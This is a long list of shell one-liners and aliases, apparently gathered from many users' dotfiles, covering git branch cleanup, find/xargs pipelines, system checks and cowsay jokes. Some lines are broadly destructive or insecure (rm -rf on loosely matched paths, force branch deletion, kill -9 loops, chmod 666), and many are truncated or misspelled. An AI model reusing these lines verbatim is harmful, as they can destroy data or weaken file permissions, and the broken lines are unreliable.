git branch --merged | grep -v \* | xargs -I % git branch -d %
git branch --merged | grep -v 'master' | xargs git branch -D
git branch --merged | grep -v '^\\*' | xargs git branch -d
git branch --merged | grep -v '\*' | xargs -n1 git branch -d && git fetch origin --prune
git branch --merged | grep -v '\*' | xargs -n 1 gitbranch -d
git branch --merged | grep -v '\*' | xargs -n 1 git branch -d
git branch --merged | grep -v '*' | xargs git branch -d
git branch --merged | grep -v '*' | xargs git branch -D
git branch --merged | grep -v '*' | xargs -n 1 git branch -d
git branch --merged | grep -v '*' | xargs -i git branch -d {}
git branch --merged | grep -v '*' | xargs -I % git branch -d %
git branch --merged | grep -Gv '*' | xargs git branch -d
git branch --merged | grep --invert-match master$ | grep --invert-match ^\*
git branch --merged | grep 'feature' | xargs -n 1 git branch -d
git branch --merged | awk '{print \$1}' | xargs git branch -d
git branch --merged origin/master | grep -v master | xargs -r -n 1 git branch -D
git branch --merged master | rg -v '^[ *]*master$' | xargs git branch -d
git branch --merged master | grep -v master | xargs git branch -d && git remote prune origin
git branch --merged master | grep -v master | xargs git branch -d
git branch --merged master | grep -v master | xargs -p -n 1 git branch -d
git branch --merged master | grep -v master | xargs -n 1 git branch -d && git fetch --prune
git branch --merged master | grep -v master | xargs -n 1 git branch -d
git branch --merged master | grep -v master | xargs -I X git branch -D X
git branch --merged master | grep -v master | grep -v
git branch --merged master | grep -v -e master | xargs -I % git branch -d %
git branch --merged master | grep -v -e 'master' -e '\*' | xargs -r -n 1 git branch -d
git branch --merged master | grep -v -e 'master' -e '\*' | xargs -n 1 git branch -d; git fetch --prune
git branch --merged master | grep -v -e 'master' -e '\*' | xargs -n 1 git branch -d && git remote prune origin
git branch --merged master | grep -v 'master$' | xargs git branch -d
git branch --merged master | grep -v '^[ *]*master$' | xargs git branch -d -r
git branch --merged master | grep -v '^[ *]*master$' | xargs git branch -d
git branch --merged master | grep -v '^ *master$' | xargs git branch -d
git branch --merged master | grep -v '\* master' | xargs -n 1 git branch -d
git branch --merged master | grep -v ' master$' | xargs git branch -d
git branch --merged master | egrep -v '\bmaster\b' | xargs git branch -d
git branch --merged master | ag -v '\* master' | xargs -n 1 git branch -d
git branch --merged development | grep -v 'development$' | xargs git branch -d
git branch --merged develop | grep -v develop | xargs git branch -d
git branch --merged develop | grep -v 'develop$' | xargs git branch -d && git remote prune origin
git branch --merged develop | grep -v 'develop$' | xargs git branch -d
git branch --merged dev | grep -v dev | xargs -n 1 git branch -d
git branch --list --no-color | sed 's/\*/ /g' | xargs -n1 -p git branch -D
git branch --color=never | grep '*' | cut -f2 -d' '
git branch --all | fzf | xargs git merge
git branch --all | fzf | xargs git checkout
git br | xargs -L1 echo | while read line; do if [[ ! \
git br | peco | xargs git rebase
git br | peco | xargs git br -d
git br | grep '*' | tr -d '* '
git br | grep '*' | cut -d ' ' -f 2-
git br > /tmp/a; cat /tmp/a | grep task | while read i; do git push lab $i; done; git push lab master;
git br --merged | grep -v master | xargs git br -d
git bm | grep -v '*' | xargs -I % git branch -d %
git bb | sed 's/refs\/remotes\/origin\///g' | awk '{for (i=8; i<=NF; i++)printf(\
git b | fzf | xargs git branch -d
git all-branches | fzf | xargs git checkout
git add `git status| grep modified: | cut -d: -f2`
git add `${GITMOD} | ${AWKCMD} ${AWKFILE} | xargs`
git add \$(git status --porcelain -s | awk '{print \$2}' | fzf)
git add . && git commit -m 'wip' || git checkout master && git pull && ./bin/setup
git add */migrations 2> /dev/null || git add */*/migrations
git add $(git status | grep modified | nf)
git add $(git status -s | cut -c4- | fzf)
git add $(git status --short | fzf --height=10% -m | awk
git -c color.ui=always status -s -z | fzf -m --ansi --read0 | cut -c 4-
git -c color.ui=always -c color.status=always status | grep -v .min.js | grep -v .min.css
git --no-pager log --pretty=oneline `curl -s https://api.stage.airtasker.com/gitref` | head -n 200 | less
git --no-pager log --pretty=oneline `curl -s https://api.dev.airtasker.com/gitref` | head -n 200 | less
git --no-pager log --pretty=oneline `curl -s https://api.airtasker.com/gitref` | head -n 200 | less
git --no-pager log --color --pretty=format:'%Cred%h%Creset - %Cblue%cn%Creset%C(auto)%d%Creset %s %Cgreen(%ad)%Creset' --date=short | emojify | less --RAW-CONTROL-CHARS
git --no-pager diff --no-color | xclip -sel clip | xclip -o -sel clip
git !git config -l | grep alias | cut -c 7-
git !git config --get-regexp 'alias.*' | colrm 1 6 | sed 's/[ ]/ = /'
git !f() { git ls-files --unmerged | cut -f2 | sort -u ; }; git add `f`
git !f() { git ls-files --unmerged | cut -f2 | sort -u ; }; $EDITOR `f`
ghuman|sort -t'=' -k2 |cut -c1-120
ghq list | xargs -n 1 -I{} bash -c 'cd ~/dev/src/{}; git remote get-url origin' | sed 's/ssh:\/\/git@/https:\/\//g'
ghq list | peco | xargs -I {} code $(ghq root)/{}
ghq list -p | peco | pbcopy
ghq list -p | peco --layout bottom-up | while read SRC_PATH; do cd $SRC_PATH; done
ghq list -p | fzf | cd
ghq list -p | ag -v vendor | p cd
ghq list --full-path | fzy | xargs rm -r
ghn list | peco | xargs open
ghi show $(git branch | grep '*' | sed 's#* \([a-zA-Z]*/\)\([0-9]*\)#\2#g')
ghi milestone | peco | sed -e
ghi list | peco | sed -e
ghf-master && git branch -l | grep -v master | xargs git branch -D
ghf-master && git branch --merged | grep -v master | xargs git branch -d
ghc-pkg dot | tred | dot -Tpdf > pkgs.pdf
ggrep || alias _grep=grep
gg(){axel $@ || wget $@;}; gg $@;
gg --color | emojify | less -r
gfind ./ -type f -printf '%s\t%p\n' | sort -nr | head -10
gfcnm | grep -e 'spec\.rb\|\.feature'
getip(){ cat /etc/hosts | grep $1 | grep $2; }; getip
getent passwd |grep /bin/bash |cut -d ':' -f 1
getList() { agrep $@ | termenu -m -o | awk -F
gem list | cut -d” ” -f1 | xargs gem uninstall -aIx
gem list | cut -d' ' -f1 | xargs gem uninstall -aIx
gem list -r 2> /dev/null | grep '^[a-zA-Z]' | awk '{print \$1}' > $HOME/.gemlist
gem environment |grep INSTALLATION | awk {'print $4'}
gdw `${GITMOD} | ${AWKCMD} ${AWKFILE} | xargs`
gdu -cks err.txt generated.file succ.txt |sort -rn |head -11
gdb --pid=`ps -acx | grep cxxserver | cut -d ' ' -f 1`
gd --name-only | grep py | xargs yapf --in-place
gd --name-only | grep py | xargs ls
gd --name-only | grep -e '\\.rb$' | xargs rubocop
gd --name-only develop | ag js | xargs ../gabi-react/node_modules/eslint/bin/eslint.js
gd --color-words --word-diff-regex='[^[:space:]]|([[:alnum:]]|UTF_8_GUARD)+'
gco $(git rev-list --all | rg $(git rev-parse HEAD) -B1 | head -n 1)
gco $(git rev-list --all | rg $(git rev-parse HEAD) -A1 | tail -n 1)
gcm; git merge $(git branch --sort=-committerdate | head -1 | xargs); gp
gcloud config set project \`gpls | fzf | awk '{print \$1}'\`
gcloud config list core/project 2> /dev/null | grep 'project =' | cut -f 3 -d ' '
gcertstatus || gcert; ssh -F ~/.ssh/config_home
gcertstatus || gcert; scp -F ~/.ssh/config_home
gcc -march=native -Q --help=target|grep march|awk '{print \$2}'
gcc -march=native -Q --help=target |grep masm= |awk '{print \$2}'
gbv --no-color | awk '/: gone]/{print $1}' | xargs git branch -D
gbr --merged master | grep -v master | sed 's/^ origin\///g'
gbr --format='%(refname:short)' | fzy --promot='❯ '| command xargs -n 1 git switch
gb | tr -d '\n' | pbcopy
gb | grep '^*' | sed 's/*\ //'
gb | fzf -m | xargs git checkout
gb | fzf -m | xargs git branch -d
gb | fzf -m | xargs git branch -D
gb 2>/dev/null | grep \* | cut -d ' ' -f2
gb --merged | grep -v master | xargs git branch -d
gatling -sf \${HOME}/v2/v2-load-tests/simulations -s CreateEventSimulation | grep -A1 'EVENT VANITY NAME' | tail -n 1
ga -p $(gs | pick | awk
g4 opened | cut -f 1 -d '#' | cut -f 5- -d '/'
g-s-p | grep '^ M ' | awk '{print $2}'
g-remote-merged-branches | xargs -I% git push origin :% 2>&1 | tee -a ~/Desktop/delete_branches.log
g-remote-merged-branches | xargs -I% git push -n origin :% 2>&1 | tee -a ~/Desktop/delete_branches_dry_run.log
g-not_staged | awk '{print $2}' | xargs git update-index --remove --ignore-missing --force-remove --assume-unchanged --skip-worktree --again -q --
g status || ls -t
g status --porcelain | cut -b 1-3 --complement | grep
g st -s | ag -v -s D | cut -d' ' -f3
g show | grep '\(console.\|window.\)'
g show | grep '\(Debug\.log\|git\)'
g s -s | perl -pe 's/[ AM?]+(.*)/\$1/' | xargs -I {} subl {}
g push origin \$(g br | ag '\*' | cut -d ' ' -f 2)
g push origin -f \$(g br | ag '\*' | cut -d ' ' -f 2)
g log --oneline --color | emojify | less
g lg | ag '(hours)|([1-7] days)' --nocolor
g git diff-index --quiet HEAD -- || clear; git --no-pager diff --patch-with-stat
g diff | grep '\(console.\|window.\)'
g diff --color-words --word-diff-regex='[^[:space:]]|([[:alnum:]]|UTF_8_GUARD)+'
g branch | grep -v master | xargs git branch -D
g branch | cut -b 1-2 --complement | grep
g branch -D \`git branch | grep -v master | grep -v staging\`; git fetch -p
g branch --merged | grep -v master | xargs git branch -d && git remote prune origin
g br --merged $(current_branch) | grep -v '\*\|master'
g br --format='%(refname:short)' | fzy --prompt='❯ ' | command xargs -n 1 git switch
g ^0.0.0.0; echo ""====ifconfig eth0 | g inet"";ifconfig eth0 | g ""inet ""; echo
fzf | xargs -I{lin} echo \'{lin}\' | xargs xdg-open
fzf | xargs -I{lin} echo \'{lin}\' | xargs nvim
fzf | tr -d '\n' | xclip
fzf --preview '(highlight -O ansi -l {} || head -n 100)'
fusermount -u /home/joedang/Documents/journal && df | grep /home/joedang/Documents/journal | sed
fuser -v /dev/nvidia* | grep -o -E '[0-9]+' | xargs kill -9
function { test -z $1 -o -d $1 && ls $* || less $* }
function { test -z $1 && ls -d . .. || ls -d $1/.* }
function { test -z $1 && kill -9 % || kill -9 $1 }
function { test -z $1 && kill % || kill $1 }
function { ps -ef | head -n 1 && ps -ef | ag $1 }
function load-env { export $(cat $1 | grep -v ^# | xargs); }; load-env
function kdploy() { helm list | rg $1 | awk
function echoCopy(){echo $1 | xclip -i -f -selection primary | xsel -i --clipboard}; echoCopy
function chrome { google-chrome-stable $@ || chromium $@; }
function _syg () { systemctl list-units | grep -i \$* ; systemctl list-unit-files | grep -i \$* ; } ; _syg
function _syg () { systemctl list-units | gr -i \$* ; systemctl list-unit-files | gr -i \$* ; } ; _syg
function _ps(){ ps -aux | grep $@ | grep -v grep };_ps
function _mdless(){ pandoc -s -f markdown -t man $@ | groff -T utf8 -man | less;};_mdless
function _diff(){ diff -y $1 $2 | colordiff | less ;}; _diff
function _cpwd(){if [ $# -gt 0 ] ; then echo `lsf $1` && echo `lsf $1` | pbcopy;else echo `pwd` && echo `pwd` | pbcopy;fi}; _cpwd
function _bigdirs(){ du -xh -d 1 $1 | sort -rh | head };_bigdirs
func() { if $(echo '[ ! -z $1 ]'); then; message=$(echo '$@'); else; message='Changed files: '$(echo '$(git status --porcelain | cut -c4- | tr
fun () {highlight -O ansi -i $1 2>/dev/null || command cat $1;}; fun
frequent_used_sub_command | pyp 'int(w[0]) > 50 | len(w[1]) > 3'
frequent_used_command | pyp 'int(w[0]) > 50 | len(w[1]) > 3'
free | grep Mem | awk '{print
free | grep Mem | awk
free -m | grep Swap: | awk '{print \$3}'
free -m | grep Swap: | awk '{print \$2}'
free -m | grep Swap | awk
free -m | grep Mem: | awk '{print \$3}'
free -m | grep Mem: | awk '{print \$2}'
free -m | grep Mem | awk
free -m -l -t; echo; cat /proc/meminfo | grep -i HugePages | cat
free -h; echo; ps aux | sort -rn +3 | head
free -h | grep -v 'cache:' | grep -v 'Swap:'
free -g | grep Mem | awk
free --giga | sed -n 2p | awk '{print \$NF}'
fortune|cowsay|lolcat -F 0.5
fortune|cowsay|lolcat
fortune| cowsay -f ghostbusters| lolcat
fortune-es | cowsay -f tux | lolcat
fortune | tee temp | cowsay && say -f temp
fortune | randomcowsay | lolcat
fortune | cowthink | lolcat
fortune | cowthink -d | lolcat
fortune | cowsay | toilet --gay -f term
fortune | cowsay | lolcat -t
fortune | cowsay | lolcat
fortune | cowsay -p | toilet -F gay -f term
fortune | cowsay -n | lolcat
fortune | cowsay -f tux | lolcat -a
fortune | cowsay -f sodomized | lolcat
fortune | cowsay -f moose | lolcat
fortune | cowsay -f kitty | lolcat
fortune | cowsay -f flaming-sheep -d | lolcat -F 0.15
fortune | cowsay -f dragon.cow | lolcat
fortune | cowsay -f dragon-and-cow | lolcat
fortune | cowsay -f dragon | lolcat
fortune | cowsay -f bud-frogs | lolcat
fortune | cowsay -f blowfish | lolcat
fortune | cowsay -f /usr/local/Cellar/cowsay/3.04/share/cows/walle.cow | lolcat
fortune | cowsay -f $(ls /usr/share/cowsay/cows/ | shuf -n1)
fortune | cowsay -f $(ls /usr/local/Cellar/cowsay/3.04/share/cows | gshuf -n1)
fortune | cowsay -f $(find /usr/share/cows -type f | shuf -n 1)
fortune GoT | cowsay -f dragon-and-cow | lolcat
fortune -s | cowsay | tee >(convert -background black -fill white -font ~/font-copies/Monaco.ttf -pointsize 14 label:@- ~/Desktop/Cowsay/cowsay_$(date +%T).png)
fortune -s | cowsay -f tux | lolcat
fortune -s computers | cowsay | lolcat; uname -a
fortune -s computers | cowsay -f moose | lolcat -i
fortune -os | cowsay | lolcat -a
fortune -o | cowsay -n | lolcat -f
fortune -c | cowthink -f $(find /usr/share/cows -type f | shuf -n 1)
fortune -as | cowsay -f \$(ls /usr/share/cowsay/cows/ | shuf -n1)
fortune -ae computers debian linux linuxcookie | cowsay | lolcat -t
fortune -a | fmt -80 -s |ponysay
fortune -a | cowsay | lolcat -p 6
fortune -a | cowsay | lolcat
format.sh $(git status | grep modified | awk '{ print $NF }')
for x in `git status | grep deleted | awk \
for x in `git status | grep deleted | awk '{print $3}'`; do git rm $x; done
for x in `docker ps -a | tail +2 | cut -d' ' -f1` ; do docker rm $x ; done
for x in \`jobs | sed 's/\[//' | sed 's/\].*//'\`;do kill %$x;done;python3 $name &
for x in $(svn st | grep ^? | awk '{ print $NF }'); do svn add $x; done
for t in $(cd postProcessing/rigidBodyMotion; ls -1|sort -g); do cat postProcessing/rigidBodyMotion/$t/rigidBodyMotion.dat; done|isofPlotTabular -
for service in $(kubectl get po |grep -- -0 |awk '{print $1}'); do echo service $service; kubectl logs $service ; done
for s in $(ipcs -s | grep $(whoami) | cut -f1 -d
for s in $(ipcs -m | grep $(whoami) | cut -f1 -d
for route in `ip -6 r | grep seg6local | awk '{ print $1}'`; do sudo ip -6 route del \$route ; done
for remote in `git branch -r | grep -v HEAD | grep -v master`; do git branch --track ${remote#origin/} $remote 2>/dev/null; done
for p in $(oc get pods | grep Terminating | awk
for n in `seq 10` ; do cat /dev/urandom | tr -dc a-z0-9 | head -c8 ; echo ; done
for link in \`git show -s --format=%B HEAD | grep 'https.*\(jira\|honeybadger\)'\`; open \$link;
for interface in $(ifconfig | perl -nle '/^(\w+\d*)/ && print $1'); do echo $interface; ifconfig $interface | perl -nle '/(\d+\.\d+\.\d+\.\d+)/ && print $1'; echo ''; done
for i in {1..10}; do /usr/bin/time -p $1; done 2>&1 | ag real | sed -e 's/real //'
for i in {0..3}; do echo 2100000 | sudo tee /sys/devices/system/cpu/cpu$i/cpufreq/scaling_max_freq; echo conservative | sudo tee /sys/devices/system/cpu/cpu$i/cpufreq/scaling_governor; done
for i in flanneld docker kube-apiserver kube-controller-manager kube-scheduler kubelet kube-proxy; do systemctl status $i | head -5 ; done | grep active -A3 -B3
for i in `tmux ls | grep -v attached | awk -F: '{print $1}'`;do tmux kill-session -t $i;done
for i in `set|grep --color=never ^OS_|sed
for i in `ps -ef | grep Elastic | awk
for i in \`ps -ef|grep 'nginx -p'|awk '{print $2}'\`; do kill $i; done
for i in \`docker images | awk '/ramo|none/ {print \$3}'\`; do docker rmi -f \$i; done
for i in \$(dcos task --json | jq --raw-output '.[] | .name') ; do dcos task log --line=10000 \$i > \$i-stdout.log; dcos task log --line=10000 \$i stderr > \$i-stderr.log; done
for i in /sys/class/thermal/thermal_zone?/temp; do echo $(cat $i | cut -c1-2).$(cat $i | cut -c3-3)°; done
for i in $(svn st | grep \? | cut -c 9-); do echo $i && rm -r $i; done
for i in $(screen -ls | grep Detached | cut -f2); do screen -X -S $i quit; done
for i in $(find . -type l); do [ -e $i ] || echo $i; done
for i in $(docker ps|cut -d\ -f1|grep -v CON); do docker kill ${i} ; done
for h in $(docker images | egrep \^.none.\\s | egrep -o
for file in `git status | grep modified | awk '{print $3}'`; do kate $file; done
for f in $(ps auxfwww | grep firefox | awk {'print$2'}); do kill -9 $f; done
for dir in $(find . -type f -name Gemfile | xargs -n 1 dirname | sort); do; cd $dir; pwd; bundle; cd -; done;
for dir in $(find . -type d -name .git | xargs -n 1 dirname | sort); do; cd $dir; pwd; git pull; cd -; done;
for dir in $(find . -type d -maxdepth 1) ; do (cd $dir && is.repo && git pull) ; done || true
for dir in $(find . -type d -maxdepth 1) ; do (cd $dir && is.repo && git clean -dfx) ; done || true
for d in `find . -xdev -maxdepth 1 -type d `; do echo `find $d -xdev | wc -l` $d ; done | sort -g
for d in $(ls | fzf --multi); do cd $d && echo [$d] && git fetch --all --prune -q && git rev-list --count --left-right @{upstream}...HEAD | awk
for crd in $(kc get crds | grep -v NAME | awk
for a in \`seq 1 6\`; do ping -c 1 192.168.10.\$a | grep -u1 '1 recei' | grep ^\-; done
folder | sed 's/+//g;s/\.//g;s/;//g' | awk '{printf
fold -w40 | head -n5 | sed '-es/./ /'{1..40..10}
firefox tmp/en-US/html-single/index.html || firefox tmp/en-US/html-desktop/index.html
finger | head -n 1; finger | grep $ME
findcpp | rs -v '(^|\/)Test\/'
findapk | head -1 | xargs adb-run.sh
find ~/workspace -type f -maxdepth 1 | grep -v DS_Store | xargs rm
find ~/templates -type f | peco | xargs cat
find ~/src/git/cheatsheets/pdf/ -type f | rofi -dmenu | xargs -r evince
find ~/src -type d -name target -print0 | xargs -0 du -hcd0 | sort -h
find ~/scratchOld/ -path ~/scratchOld/RecyleBin -prune -o -type f | xargs touch ; find ~/scratchOld/ -path ~/scratchOld/RecyleBin -prune -o -type d | xargs touch
find ~/salt-developer/code/api/data/reports -name 'index.html' | rg 'html/index.html' | xargs open
find ~/Documents/GoPro -iname '*.mp4' | wc -l | awk '{print \$1}'
find ~/.wallpaper -type f \( -name '*.jpg' -o -name '*.png' \) -print0 |shuf -n1 -z | xargs -0 feh --bg-fill
find ~/.exts/ | fzf | xargs -r nvim
find ~/.deepinwine/qqintl| grep FileRecv | grep $1
find ~/ -mtime -2 | xargs ls -dtF | less
find ~ -type l -exec ls -o {} \; | grep dropbox >| ${DROPBOX_HOME}/symlinks.dropbox.${USER}@${HOSTNAME}.txt
find ~ -type d -name .git | while read gitfolder;do echo $gitfolder; cd $gitfolder; cd ..; git --git-dir=$gitfolder status; push; done | mate
find || alias fii=fd
find tmp/capybara | tail -1 | xargs open
find test/unit -name '*.rb' | sort | xargs glark $*
find test/integration -name '*.rb' | sort | xargs glark $*
find test -name '*.rb' | sort | xargs glark $*
find src/test/java/com/webmethods -name \*.java | sort | xargs glark
find src/test/java/com/softwareag -name \*.java | sort | xargs glark
find src/test/java -name '*.java' | sort | xargs glark $*
find src/test -name \*.java | sort | xargs glark
find src/main/java/com/webmethods -name \*.java | sort | xargs glark
find src/main/java/com/softwareag -name \*.java | sort | xargs glark
find src/main/java -name '*.java' | sort | xargs glark $*
find src/main -name \*.java | sort | xargs glark
find public -type f -name '*.html' | xargs ls -l | h public
find node_modules -name 'node_modules' -type d | xargs ls | wc -l
find lib -name '*.rb' | sort | xargs glark $*
find build -name *.o | xargs -n 1 nm --print-file-name | grep \
find \$(manpath | tr : ' ') | grep
find 2> >(grep -Ev 'Brak dostępu|Brak dostępu|Permission denied' >&2)
find /usr/share/icons/gnome/scalable -type f | grep svg | sort -u
find /media/others/KuGou/流行/| grep mp3 | shuf > /tmp/mp3.lst;mpv --playlist=/tmp/mp3.lst
find /media/others/KuGou/古风/| grep mp3 | shuf > /tmp/mp3.lst;mpv --playlist=/tmp/mp3.lst
find /media/others/KuGou/| grep mp3 | shuf > /tmp/mp3.lst;mpv --playlist=/tmp/mp3.lst
find /likely/path -mtime -1 -print | egrep -i '\.save$|\.save\.[1-90]*$'
find /home/moquist/docs/majen.net-documents/clients/ | grep invoice | sed
find /home/albert/Dropbox/references -type f | fzy | xargs kde-open5
find /etc -type f -mtime -15 -print | grep -v lvm | sort
find /Applications/ -type d -name *Electron* | sed -E 's/\/Applications\///g' | sed -E 's/\.app.+//g'
find / -type f -size +100M -print0 | xargs -0 du -h | sort -nr
find .| grep pm$ | xargs -n 1 perl -c
find ./err.txt ./generated.file ./succ.txt -type f |sort| xargs grep
find ./ | sed -e 's/[^-][^\/]*\//--/g;s/--/ |-/'
find ./ | grep pyc | xargs rm -f
find ./ -type f | grep .DS_Store | xargs rm
find ./ -type f | grep -v \.svn | xargs grep -C1 --color=auto
find ./ -type f -size +5M -print0 | xargs -0 ls -halt | sort -rn -k5
find ./ -type f -printf '%s\t%p\n' | sort -nr | head -10
find ./ -type f -print | xargs grep '' | grep$1
find ./ -type f -ls | sort -k 7 -r -n | head -5
find ./ -type f -exec perl -pi -e 's/\r\n|\n|\r/\n/g' {} \;
find ./ -type d | xargs chmod -v 755 ; find ./ -type f | xargs chmod -v 644
find ./ -type d | sed -e 's/[^-][^\/]*\//--/g;s/--/ |-/'
find ./ -type d -ls | sort -k 7 -r -n | head -5
find ./ -printf '%s %p\n'| sort -nr | head -20
find ./ -name *.apk | peco | xargs adb install -r
find ./ -name *.apk | fzf | xargs adb install -r
find ./ -maxdepth 1 -type d -exec basename '{}' \; | sed -e '1d' | column
find ./ ${CLEAN_MAX_DEPTH} -type d -path *node_modules -exec $CLEAN_DUCOMMAND {} \; | ${CLEAN_SORT} | ${CLEAN_TOP}
find . |xargs | xjobs -v 0 -j 11 grep
find . |grep -v svn |grep
find . | sort | tail -n 1
find . | iconv -f utf8 -t latin1 | tail -n 1 && echo
find . | grep ~$ | xargs rm
find . | grep swp | xargs rm
find . | grep \.swp$ | xargs rm
find . | grep \.pyc$ | xargs rm
find . | grep \.[^\.].pyc$ | xargs rm -ivf
find . | grep [.]py$ | xargs grep
find . | grep .swp | xargs rm
find . | grep .git | xargs rm -rf
find . | grep .DS_Store | xargs rm
find . | grep -v .svn | xargs grep -Isn --color=auto
find . | grep -v .svn | xargs egrep -n
find . | grep -v .hg | grep
find . | grep -v '~' | ack -i $*
find . | grep '\..*sw[op]$' | xargs rm
find . | cpio -o -H newc | gzip > ../ramdisk.img
find . type f | xargs du -h | sort -rn
find . \\( -name '*.MP4' -o -name '*.MOV' -o -name '*.RW2' \\) -exec md5 -q {} \\; | sort | md5
find . \( -name pkg -prune \) -o \( -name '*.*rb' -print \) | sort | xargs glark $*
find . \( -name \*.thrift \) | grep -v .svn | xargs egrep -n --color
find . \( -name \*.h -o -name \*.hh \) | grep -v .svn | xargs grep -n
find . \( -name \*.h -o -name \*.hh \) | grep -v .svn | xargs egrep -n
find . \( -name \*.h -o -name \*.hh -o -name \*.hpp \) | grep -v .svn | xargs egrep -n --color
find . \( -name \*.cpp -o -name \*.h -o -name \*.cc -o -name \*.hh -o -name \*.c -o -name \*.dbc -o -name \*.l -o -name \*.y -o -name \*.rl \) | grep -v .svn | xargs grep -n --color
find . \( -name \*.cpp -o -name \*.h -o -name \*.cc -o -name \*.hh -o -name \*.c -o -name \*.dbc -o -name \*.l -o -name \*.y -o -name \*.rl \) | grep -v .svn | xargs grep -n
find . \( -name CMakeLists.\* \) | grep -v .svn | xargs grep -n
find . \( -name CMakeLists.\* \) | grep -v .svn | xargs egrep -n
find . \( -name CMakeLists.\* -o -name TARGETS \) | grep -v .svn | xargs egrep -n --color
find . \( -iname '*.[ch]' -o -iname '*.php' -o -iname '*.pl' \) | xargs wc -l | sort -n
find . -type f|grep -v tags|xargs grep --color=auto -n
find . -type file ! -path './.git/*' | peco | xargs -o vim
find . -type f |grep -v .git | shuf -n 1
find . -type f | xargs wc -l | sort -k 1 -g
find . -type f | xargs grep . | grep
find . -type f | while read i; do file $i | grep -q SQLite; [ $? = 0 ] && (echo $i; sqlite3 -csv $i .tables; echo); done
find . -type f | sort -R | tail
find . -type f | sort --version-sort | xargs -d'\n' mcomix
find . -type f | perl -ne 'print \$1 if m/\\.([^.\\/]+)$/' | sort -u
find . -type f | perl -ne 'print $1 if m/\.([^.\/]+)$/' | sort -u
find . -type f | perl -lne 'print if -T;' | xargs egrep -riHnT
find . -type f | grep \.scala | xargs grep
find . -type f | grep -v .svn | xargs egrep -n --color
find . -type f | fzf | ifne xargs nvim
find . -type f | egrep -v svn | xargs egrep --color=always
find . -type f \( -name '*~' -o -name '#*#' -o -name '.*~' -o -name '.#*#' -o -name 'core' -o -name 'dead.letter*' \) | grep -v auto-save-list | xargs -t rm
find . -type f 2>/dev/null | xargs du -a 2>/dev/null | awk '{ if ( \$1 > 500000) print \$0 }'
find . -type f 2>/dev/null | xargs du -a 2>/dev/null | awk '{ if ( \$1 > 5000) print \$0 }'
find . -type f -t {} \;|sort -n |tail -20
find . -type f -size +50M -name *.log -print | xargs du -hs | sort -r
find . -type f -printf '%s %p\n'| sort -nr | head -10﻿
find . -type f -printf '%s %p\n'| sort -nr | head -10
find . -type f -printf '%s %p\n' | sort -nr | head -20
find . -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r | head -n 20
find . -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r | head -5
find . -type f -printf '%TY-%Td-%Tm %.8TT %p\n' | sort -rn | head -n 10
find . -type f -print0|xargs -0 stat -c '%Y %n'|sort -n
find . -type f -print0 | xargs -0 sudo chmod +666 && find . -type d -print0 | xargs -0 sudo chmod +775 && sudo chown -R $USER:$USER .
find . -type f -print0 | xargs -0 ls -lt | head -n 1
find . -type f -print0 | xargs -0 ls -lrt | head -n 1
find . -type f -print0 | xargs -0 du -h | sort -rh > files_list.txt
find . -type f -print0 | xargs -0 chmod 644; find . -type d -print0 | xargs -0 chmod 755
find . -type f -print0 | xargs -0 cat | wc -l
find . -type f -print0 | sort -z | xargs -0 grep -P
find . -type f -print0 -o \( -type d -path './.*' -prune -o -path './tmp' -prune -o -path './log' -prune \) | xargs -0 ls -lrt | tail -n 20
find . -type f -print0 -iname \*.jpg -o -iname \*.jpeg | sort -z | xargs -0 feh -Z --auto-rotate --scale-down
find . -type f -print | grep \~$ | xargs \rm -v
find . -type f -print | grep -E '\.(c(pp)?|h)$' > cscope.files && cscope -bq
find . -type f -name *.jar |xargs -n1 -i -t jar tvf {} |grep
find . -type f -name '*.pyc'|xargs rm -f|echo '.pyc files removed'
find . -type f -name '*.php' -print0 | sort -z | xargs -0 grep -P
find . -type f -name '*.java' -exec cat {} \; | sed '/^\s*#/d;/^\s*$/d;/^\s*\/\//d' | wc -l
find . -type f -ls | sort -nrk7 | head -10
find . -type f -iregex '.*\.js$' -not -path './node_modules/*' -exec jsctags {} -f \; | sed '/^$/d' | sort > tags
find . -type f -iregex '.*\.js$' -not -path './node_modules/*' -exec jsctags {} -f \; | sed '/^$/d' | LANG=C sort > tags
find . -type f -iregex '.*\.js$' -exec jsctags {} -f \; | sed '/^$/d' | sort > tags
find . -type f -iregex '.*\.\(h\|ht\)' -print0 | xargs -0 grep --color -n
find . -type f -iname '*.py' | grep -v target | xargs grep -TnZ
find . -type f -exec sha256sum '{}' \\; | sort | sha256sum
find . -type f -exec ls -sh {} \; | sort -n -r | head -10
find . -type f -exec ls -s {} \; | sort -n | head -5
find . -type f -exec ls -s {} \; | sort -n -r | head -5
find . -type f -exec ls -s {} \; | sort -n -r | head -20
find . -type f -exec du {} \; | sort -rn | head -10
find . -type f -exec du -h {} \+ | sort -rh | head -n 5
find . -type f -exec du -h {} + | sort -rh | head -n 10
find . -type f -exec du -ah {} \; | sort -nr | head
find . -type f -exec du -Shxa {} + | sort -rh | head -n 15
find . -type f -exec du -Sh {} + | sort -rh | head -n 5
find . -type f -exec du -Sh {} + | sort -rh | head -n 20
find . -type f -exec du -Sh {} + | sort -rh | head -n 10
find . -type d | xargs du -h | sort -rn
find . -type d | xargs chmod 755; find . -type f | xargs chmod 644
find . -type d | xargs chmod 755 && find . -type f | xargs chmod 644
find . -type d | sed -e 1d -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|-/'
find . -type d | sed -e 1d -e 's/[^-][^\/]*\/--/g' -e 's/^/ /' -e 's/-/|-/'
find . -type d | grep -v .svn | xargs svn up
find . -type d -print0 | xargs -0 chmod 755; find . -type f -print0 | xargs -0 chmod 644
find . -type d -print0 | xargs -0 chmod 0755 && find . -type f -print0 | xargs -0 chmod 0644
find . -type d -print 2>/dev/null | fzf-tmux --preview 'du -sh {}/* | sort -hr'
find . -type d -name .git | xargs -n 1 dirname | while read line; do cd $line && git pull && cd .. ; done
find . -type d -maxdepth 3 | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'
find . -type d -maxdepth 1 | sort | more
find . -type d -exec du -Shxa {} + | sort -rh | head -n 15
find . -regex '.*\.sw[p|o]$' | xargs rm -v
find . -regex '.*\.\(rb\)' -print0 | xargs -0 cat | wc -l
find . -regex '.*\.\(py\)' -print0 | xargs -0 cat | wc -l
find . -regex '.*\.\(php\)' -print0 | xargs -0 cat | wc -l
find . -printf '%s %p\n'| sort -nr | head -30
find . -printf '%s %p\n'| sort -nr | head -20
find . -printf '%s %p\n'| sort -nr | head -10
find . -printf '%s %p\n' | sort -nr | tail
find . -printf '%s %p\n' | sort -nr | head -10
find . -printf '%s %p\n' | sort -nr | head
